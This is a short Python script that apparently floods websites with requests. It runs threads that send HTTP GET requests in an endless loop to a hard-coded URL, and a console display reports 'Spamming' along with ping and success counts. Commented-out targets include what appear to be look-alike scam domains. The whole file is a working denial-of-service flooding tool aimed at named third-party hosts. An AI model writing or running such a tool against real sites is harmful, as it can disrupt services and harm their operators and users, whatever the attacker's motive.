from asyncio import Lock
import os
from threading import Thread
import time
import requests
from function import  startThread


# url = "https://agilitee.cyou/84d7d07"
# url = "https://mobllelegends.com/?r=1"
url = "https://iphonexx.web.app"


successful = 0
failed = 0
recent = ""
times = []

def post():
    global successful
    global failed
    global recent
    run = True
    while run:
        res = requests.get(url)
        try:
            times.append(res.elapsed.microseconds / 1000)
            if(res.status_code == 200):
                recent = "✅ Sent succesfully"
                successful += 1
            else:
                recent = f"❌ {res.status_code} {res.text}";
                failed += 1
                run = False
        finally:
            pass

        

def draw():
    global url
    global successful
    global failed
    global recent
    while True:
        os.system("CLS")
        total = 0
        for t in times:
            total += t
        average = total / max(len(times), 1)
        print(f"Spamming: {url}")
        print(f"Ping: {round(average)}ms")
        print(f"Successful: {successful}")
        print(f"Failed: {failed}")
        print(f"Recent: {recent}")
        times.clear()
        time.sleep(1)



Thread(target=draw).start()

            
startThread(10, post);

